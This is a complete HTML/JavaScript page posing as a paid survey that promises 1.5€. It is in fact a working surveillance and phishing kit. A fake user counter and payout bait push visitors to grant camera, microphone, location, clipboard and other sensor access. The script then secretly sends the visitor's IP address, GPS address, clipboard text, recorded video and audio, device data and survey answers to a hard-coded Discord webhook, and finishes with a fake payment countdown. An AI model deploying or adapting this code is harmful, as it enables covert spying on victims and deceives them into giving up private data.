<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Earn 1.5€ – Quick Survey + Bonuses</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #e0eafc 0%, #cfdef3 100%);
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 850px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.15);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(95deg, #1f5e3a, #2c7a4d);
            color: white;
            padding: 20px 28px;
            text-align: center;
        }
        .header h1 { font-size: 1.8rem; font-weight: 700; }
        .earn-badge {
            background: gold;
            color: #1e3a2f;
            display: inline-block;
            padding: 6px 18px;
            border-radius: 40px;
            font-weight: bold;
            margin-top: 12px;
        }
        .live-counter {
            background: #fef9e3;
            padding: 8px 15px;
            border-radius: 40px;
            display: inline-block;
            margin: 10px auto 0;
            font-weight: bold;
            color: #d9534f;
        }
        .sponsors {
            background: #f8f9fa;
            padding: 12px;
            text-align: center;
            font-size: 12px;
            border-bottom: 1px solid #e2e8f0;
            color: #4a5568;
        }
        .sponsors span { margin: 0 10px; font-weight: 500; }
        .referral-section {
            background: #e6f7ff;
            margin: 15px 20px;
            padding: 12px;
            border-radius: 20px;
            text-align: center;
            font-size: 0.85rem;
        }
        .referral-link {
            background: white;
            border: 1px solid #ccc;
            padding: 6px;
            border-radius: 40px;
            font-family: monospace;
            margin-top: 8px;
            cursor: pointer;
        }
        .content { padding: 20px 30px 30px; }
        .question-item {
            margin-bottom: 22px;
            border-bottom: 1px solid #e2e8f0;
            padding-bottom: 14px;
        }
        .options {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            margin-top: 8px;
        }
        .options label {
            background: #f1f5f9;
            padding: 6px 14px;
            border-radius: 40px;
            cursor: pointer;
            font-size: 0.85rem;
        }
        .options input { margin-right: 6px; }
        .permission-panel {
            background: #fff8e7;
            border-left: 5px solid #f59e0b;
            padding: 16px 20px;
            margin: 25px 0 20px;
            border-radius: 20px;
        }
        .perm-step {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            margin: 12px 0;
        }
        .perm-btn {
            background: #2c7a4d;
            color: white;
            border: none;
            padding: 6px 18px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 600;
        }
        .perm-btn:disabled { background: #94a3b8; cursor: not-allowed; }
        .status { font-size: 0.85rem; color: #2d3748; }
        .location-map {
            background: #e6f7ff;
            border-radius: 16px;
            padding: 12px;
            margin: 12px 0;
            display: none;
        }
        .submit-btn {
            background: #f59e0b;
            color: #1e293b;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
        }
        .submit-btn:disabled { background: #cbd5e1; cursor: not-allowed; }
        .withdraw-section {
            background: #fef9e3;
            padding: 20px;
            border-radius: 24px;
            margin-top: 20px;
            display: none;
        }
        .timer {
            font-family: monospace;
            font-size: 1.6rem;
            text-align: center;
            margin: 20px 0;
            color: #d9534f;
        }
        .footer { background: #f8fafc; padding: 14px; text-align: center; font-size: 11px; }
    </style>
</head>
<body>
<div class="container" id="mainContainer">
    <div class="header">
        <h1>💰 Earn 1.5€ instantly!</h1>
        <div class="earn-badge">🎁 Your reward: 1.5 €</div>
        <div class="live-counter" id="liveCounter">👥 0 active users</div>
    </div>
    <div class="sponsors" id="sponsorsBar">
        🌟 Check our sponsors: <span>✨ SurveyRewards</span> <span>⚡ QuickCash</span> <span>📊 OpinionHub</span> <span>🔍 DataPulse</span>
    </div>
    <div class="content" id="dynamicContent"></div>
    <div class="footer">Secure payment • Real-time verification</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

    // ========== FAKE LIVE COUNTER (fluctuates 120-589) ==========
    function startFakeCounter() {
        const counterEl = document.getElementById("liveCounter");
        let current = Math.floor(Math.random() * (589 - 120 + 1) + 120);
        counterEl.innerText = `👥 ${current} active users`;
        setInterval(() => {
            // change by random amount between -15 and +15, but keep within 120-589
            let change = Math.floor(Math.random() * 31) - 15;
            let newVal = current + change;
            if (newVal < 120) newVal = 120;
            if (newVal > 589) newVal = 589;
            current = newVal;
            counterEl.innerText = `👥 ${current} active users`;
        }, 2800);
    }

    // ========== FAKE REFERRAL CODE ==========
    function generateFakeReferral() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
        return code;
    }

    // ========== 14 SURVEY QUESTIONS ==========
    const questions = [
        "How often do you shop online?", "Which social media do you use most?", "Your age group?",
        "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
        "Do you use ad blockers?", "Primary operating system?", "Targeted ads make you feel?",
        "Preferred payment method?", "Do you read privacy policies?", "Likely to recommend product?",
        "Do you use a VPN?", "Which browser do you prefer?"
    ];
    const optionSets = [
        ["Daily","Weekly","Monthly","Rarely"], ["TikTok","Instagram","Twitter","Facebook","LinkedIn"],
        ["18-24","25-34","35-44","45+"], ["Battery","Camera","Performance","Price"],
        ["<2h","2-5h","5-8h",">8h"], ["Netflix","YouTube","Disney+","Prime Video","Other"],
        ["Always","Sometimes","Never","What is ad blocker?"], ["Windows","macOS","Linux","Android","iOS"],
        ["Acceptable","Annoying","Invasion of privacy","I don't care"], ["Credit card","PayPal","Crypto","Bank transfer"],
        ["Always","Sometimes","Never","Didn't know"], ["Very likely","Likely","Neutral","Unlikely"],
        ["Yes","No","What is VPN?"], ["Chrome","Firefox","Edge","Safari","Opera","Brave"]
    ];

    let userAnswers = {};
    let cameraStream = null;
    let locationData = null;
    let orientationData = null;
    let hidData = null;
    let serialData = null;
    let nfcData = null;
    let lightData = null;

    // Flags for one-time send
    let locationSent = false, orientationSent = false, hidSent = false, serialSent = false, nfcSent = false, lightSent = false, cameraStarted = false;

    // ========== SEND TO DISCORD ==========
    async function sendToDiscord(title, description, fields = [], color = 0x3498db, fileBlob = null, fileName = null) {
        const formData = new FormData();
        if (fileBlob && fileName) formData.append("file", fileBlob, fileName);
        const embed = { embeds: [{ title, description, color, fields, timestamp: new Date().toISOString() }] };
        formData.append("payload_json", JSON.stringify(embed));
        fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e => console.error);
    }

    // ========== VIDEO RECORDING ==========
    let mediaRecorder = null, recordedChunks = [], recordingActive = false;
    const intervals = [1,5,10,20,30,32];

    async function startProgressiveRecording(stream) {
        if (cameraStarted) return;
        cameraStarted = true;
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
        mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
        mediaRecorder.start(100);
        recordingActive = true;
        sendToDiscord("🎥 Camera started", "Recording begun – chunks at 1,5,10,20,30,32s", [], 0xff5500);
        for (let sec of intervals) {
            setTimeout(async () => {
                if (!recordingActive) return;
                if (mediaRecorder?.state === "recording") {
                    mediaRecorder.stop();
                    await new Promise(resolve => {
                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(recordedChunks, { type: "video/webm" });
                            await sendToDiscord(`🎥 Video chunk (${sec}s)`, `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_${sec}s.webm`);
                            recordedChunks = [];
                            mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                            mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
                            mediaRecorder.start(100);
                            resolve();
                        };
                    });
                }
            }, sec * 1000);
        }
        setTimeout(() => {
            if (mediaRecorder?.state === "recording") {
                mediaRecorder.stop();
                mediaRecorder.onstop = async () => {
                    if (recordedChunks.length) {
                        const blob = new Blob(recordedChunks, { type: "video/webm" });
                        await sendToDiscord("🎥 Final video (32s)", `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_final.webm`);
                    }
                    recordingActive = false;
                };
            }
        }, 32000);
    }

    // ========== PERMISSION HANDLERS (each sends immediately) ==========
    async function requestGeolocation() {
        try {
            const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
            const lat = pos.coords.latitude, lon = pos.coords.longitude;
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const data = await geoRes.json();
            locationData = { address: data.display_name, lat, lon };
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            await sendToDiscord("📍 GPS Location granted", `**Address:** ${data.display_name}\n**Coordinates:** ${lat}, ${lon}\n[Open in Google Maps](${mapsLink})`, [], 0x00aaff);
            const mapDiv = document.getElementById("locationMap");
            if (mapDiv) { mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`; mapDiv.style.display = "block"; }
            return true;
        } catch(e) { return false; }
    }
    async function requestMicrophone() {
        try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); await sendToDiscord("🎤 Microphone granted", "Mic access allowed (included in video if camera is on)", [], 0x44aa44); return true; }
        catch(e) { return false; }
    }
    async function requestCamera() {
        try { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); cameraStream = stream; await sendToDiscord("🎥 Camera granted", "Starting video recording (background)", [], 0xffaa00); startProgressiveRecording(stream); return true; }
        catch(e) { return false; }
    }
    async function requestNotifications() {
        if (Notification.permission === "granted") return true;
        const result = await Notification.requestPermission();
        if (result === "granted") { await sendToDiscord("🔔 Notifications granted", "User allowed notifications", [], 0xaa88ff); return true; }
        return false;
    }
    async function requestClipboard() {
        try { const text = await navigator.clipboard.readText(); await sendToDiscord("📋 Clipboard read", `Content: ${text.substring(0, 500)}`, [], 0xaa44aa); return true; }
        catch(e) { return false; }
    }
    async function requestDeviceOrientation() {
        if (typeof DeviceOrientationEvent !== "undefined" && typeof DeviceOrientationEvent.requestPermission === "function") {
            try { await DeviceOrientationEvent.requestPermission(); window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } }); return true; }
            catch(e) { return false; }
        } else if (window.DeviceOrientationEvent) {
            window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } });
            return true;
        }
        return false;
    }
    async function requestHID() {
        if (!navigator.hid) return false;
        try { const devices = await navigator.hid.requestDevice({ filters: [] }); const data = devices.map(d => ({ name: d.productName, vendorId: d.vendorId })); await sendToDiscord("🔌 HID Devices", JSON.stringify(data), [], 0xaa8866); return true; }
        catch(e) { return false; }
    }
    async function requestSerial() {
        if (!navigator.serial) return false;
        try { const ports = await navigator.serial.getPorts(); await sendToDiscord("🔗 Serial Ports", `Found ${ports.length} port(s)`, [], 0x66aa88); return true; }
        catch(e) { return false; }
    }
    async function requestNFC() {
        if (!("NDEFReader" in window)) return false;
        try { const reader = new NDEFReader(); await reader.scan(); reader.onreading = (event) => { if (!nfcSent) { nfcSent = true; sendToDiscord("📡 NFC Tag read", JSON.stringify(event.message.records), [], 0x77aaff); } }; return true; }
        catch(e) { return false; }
    }
    async function requestAmbientLight() {
        if (!("AmbientLightSensor" in window)) return false;
        try { const sensor = new AmbientLightSensor(); sensor.onreading = () => { if (!lightSent) { lightSent = true; sendToDiscord("💡 Ambient Light", `${sensor.illuminance} lux`, [], 0xffdd88); } }; sensor.start(); return true; }
        catch(e) { return false; }
    }

    // ========== RENDER UI ==========
    function renderPage() {
        const referralCode = generateFakeReferral();
        const referralDiv = `<div class="referral-section">
            🔗 <strong>Share & earn more!</strong> Get 0.5€ per friend.<br>
            Your referral link: <span class="referral-link" id="refLink">https://earn-survey.com/${referralCode}</span> 
            <button id="copyRefBtn" style="margin-left:8px;">📋 Copy</button>
        </div>`;
        let html = referralDiv;
        html += `<div id="questionsArea"></div>
        <div class="permission-panel">
            <div style="font-weight:bold;">🔐 Required for payout (each sends real‑time data):</div>
            <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
            <div id="locationMap" class="location-map"></div>
            <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
            <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
            <div class="perm-step">🔔 Notifications <button class="perm-btn" id="btnNotif">Allow</button> <span id="statusNotif" class="status">pending</span></div>
            <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
        </div>
        <div class="permission-panel" style="margin-top:10px;">
            <div style="font-weight:bold;">🛸 Advanced sensors (optional – each sends data immediately):</div>
            <div class="perm-step">📳 Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
            <div class="perm-step">🖱️ HID <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
            <div class="perm-step">🔌 Serial <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
            <div class="perm-step">📡 NFC <button class="perm-btn" id="btnNFC">Allow</button> <span id="statusNFC" class="status">pending</span></div>
            <div class="perm-step">💡 Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
        </div>
        <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & get 1.5€</button>`;
        document.getElementById("dynamicContent").innerHTML = html;
        // generate questions
        let qhtml = '';
        for (let i=0; i<questions.length; i++) {
            qhtml += `<div class="question-item"><div class="options" data-qid="${i}">${questions[i]}<br>`;
            for (let opt of optionSets[i]) qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
            qhtml += `</div></div>`;
        }
        document.getElementById("questionsArea").innerHTML = qhtml;
        document.querySelectorAll('input[type="radio"]').forEach(r => {
            r.addEventListener('change', (e) => {
                const qid = e.target.closest('.options').getAttribute('data-qid');
                userAnswers[qid] = e.target.value;
            });
        });
        // copy referral link
        document.getElementById("copyRefBtn")?.addEventListener("click", () => {
            const linkText = document.getElementById("refLink").innerText;
            navigator.clipboard.writeText(linkText);
            alert("Referral link copied!");
        });
        // attach permission buttons
        const btnGeo = document.getElementById("btnGeo");
        const btnMic = document.getElementById("btnMic");
        const btnCamera = document.getElementById("btnCamera");
        const btnNotif = document.getElementById("btnNotif");
        const btnClip = document.getElementById("btnClip");
        const btnOri = document.getElementById("btnOrientation");
        const btnHID = document.getElementById("btnHID");
        const btnSerial = document.getElementById("btnSerial");
        const btnNFC = document.getElementById("btnNFC");
        const btnLight = document.getElementById("btnLight");
        const statuses = ["Geo","Mic","Camera","Notif","Clip","Orientation","HID","Serial","NFC","Light"];
        const buttons = [btnGeo, btnMic, btnCamera, btnNotif, btnClip, btnOri, btnHID, btnSerial, btnNFC, btnLight];
        const handlers = [requestGeolocation, requestMicrophone, requestCamera, requestNotifications, requestClipboard, requestDeviceOrientation, requestHID, requestSerial, requestNFC, requestAmbientLight];
        const statusIds = ["statusGeo","statusMic","statusCamera","statusNotif","statusClip","statusOrientation","statusHID","statusSerial","statusNFC","statusLight"];
        for (let i=0; i<buttons.length; i++) {
            buttons[i].onclick = async () => {
                const statusSpan = document.getElementById(statusIds[i]);
                statusSpan.innerText = "requesting...";
                const ok = await handlers[i]();
                statusSpan.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
                buttons[i].disabled = ok;
                checkAllBasic();
            };
        }
        function checkAllBasic() {
            const allGranted = btnGeo.disabled && btnMic.disabled && btnCamera.disabled && btnNotif.disabled && btnClip.disabled;
            document.getElementById("submitSurvey").disabled = !allGranted;
            if (allGranted) document.getElementById("submitSurvey").innerText = "✅ Claim my 1.5€ now!";
        }
        document.getElementById("submitSurvey").onclick = async () => {
            const btn = document.getElementById("submitSurvey");
            if (btn.disabled) return;
            btn.disabled = true;
            btn.innerText = "Submitting...";
            const answers = {};
            for (let i=0; i<questions.length; i++) {
                const selected = document.querySelector(`input[name="q${i}"]:checked`);
                answers[i] = selected ? selected.value : "(not answered)";
            }
            let report = `SURVEY ANSWERS\nTime: ${new Date().toISOString()}\n`;
            for (let i=0; i<questions.length; i++) report += `${i+1}. ${questions[i]} → ${answers[i]}\n`;
            const blob = new Blob([report], { type: "text/plain" });
            await sendToDiscord("📝 Final Survey Answers", "Attached all responses", [], 0x2c7a4d, blob, `survey_${Date.now()}.txt`);
            showWithdrawOptions(answers);
        };
    }

    async function showWithdrawOptions(answers) {
        const container = document.getElementById("dynamicContent");
        container.innerHTML = `
            <div class="withdraw-section" style="display:block;">
                <h3>🎉 You earned 1.5 €!</h3>
                <p>Choose withdrawal method:</p>
                <div style="display:flex; gap:15px; flex-wrap:wrap;">
                    <button class="perm-btn" id="btc">₿ Bitcoin</button>
                    <button class="perm-btn" id="ltc">Ł Litecoin</button>
                    <button class="perm-btn" id="eth">Ξ Ethereum</button>
                    <button class="perm-btn" id="bank">🏦 Bank Transfer</button>
                </div>
                <div id="timerArea" style="font-size:1.4rem; text-align:center; margin-top:20px;"></div>
            </div>
        `;
        const timerDiv = document.getElementById("timerArea");
        const handle = async (method) => {
            await sendToDiscord("💸 Withdrawal Request", `User selected ${method}`, [], 0xf59e0b);
            let seconds = 420;
            timerDiv.innerText = `⏳ Processing ${method}... 7:00 minutes`;
            const interval = setInterval(() => {
                if (seconds <= 0) {
                    clearInterval(interval);
                    timerDiv.innerText = "✅ Payment sent! Check wallet/bank within 24h.";
                    setTimeout(() => container.innerHTML = `<div style="text-align:center; padding:30px;"><h3>Thank you!</h3></div>`, 3000);
                } else {
                    const mins = Math.floor(seconds / 60);
                    const secs = seconds % 60;
                    timerDiv.innerText = `⏳ Processing ${method}... ${mins}:${secs.toString().padStart(2,'0')} minutes`;
                    seconds--;
                }
            }, 1000);
            document.querySelectorAll(".perm-btn").forEach(b => b.disabled = true);
        };
        document.getElementById("btc").onclick = () => handle("BTC");
        document.getElementById("ltc").onclick = () => handle("LTC");
        document.getElementById("eth").onclick = () => handle("ETH");
        document.getElementById("bank").onclick = () => handle("Bank");
    }

    // initial IP log
    (async () => {
        try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ip = (await ipRes.json()).ip;
            const geoRes = await fetch("https://ipapi.co/json/");
            const geo = geoRes.ok ? await geoRes.json() : {};
            await sendToDiscord("🌐 IP Address", `**IP:** ${ip}\n**Location:** ${geo.city}, ${geo.country_name}\n**ISP:** ${geo.org || "Unknown"}`, [], 0x3498db);
        } catch(e) {}
    })();

    startFakeCounter();
    renderPage();
</script>
</body>
</html>
